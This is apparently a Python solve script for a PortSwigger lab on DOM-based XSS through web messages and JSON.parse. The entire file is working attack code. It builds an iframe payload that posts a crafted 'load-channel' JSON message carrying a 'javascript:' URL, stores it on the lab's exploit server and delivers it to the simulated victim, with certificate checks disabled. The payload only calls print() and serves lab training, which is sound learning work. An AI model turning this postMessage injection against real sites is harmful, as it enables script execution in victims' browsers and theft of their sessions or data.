#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: DOM XSS using web messages and JSON.parse.

The lab's message listener JSON.parse()s e.data and, on `type: 'load-channel'`,
assigns data.url to an iframe's .src. We send a JSON message whose url is a
`javascript:print()` URL to execute print() in the lab's origin.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


EXPLOIT_BODY_TEMPLATE = (
    '<iframe src={lab}/ '
    'onload=\'this.contentWindow.postMessage('
    '"{{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:print()\\"}}",'
    '"*")\'>'
)


def post_exploit(exploit_server: str, body: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": body,
        "formAction": "STORE",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Stored exploit on server")


def deliver(exploit_server: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "formAction": "DELIVER_TO_VICTIM",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Delivered exploit to victim")


def main():
    parser = argparse.ArgumentParser(
        description="Solve DOM-based Lab 3: DOM XSS via web messages + JSON.parse"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("exploit_url", help="Exploit server URL")
    parser.add_argument("--deliver", action="store_true", help="Store + DELIVER_TO_VICTIM")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_url.rstrip("/")

    body = EXPLOIT_BODY_TEMPLATE.format(lab=lab)
    print("[+] Exploit server body:\n")
    print(body)

    if args.deliver:
        s = requests.Session()
        s.verify = False
        post_exploit(exploit, body, s)
        deliver(exploit, s)
        r = s.get(lab)
        if "Congratulations" in r.text or "is-solved" in r.text:
            print("[+] Lab solved!")
        else:
            print("[*] Lab not yet marked solved — give the victim a few seconds and re-check.")
    else:
        print("\n[*] Paste the body into the exploit server, Store, then Deliver to Victim.")


if __name__ == "__main__":
    main()
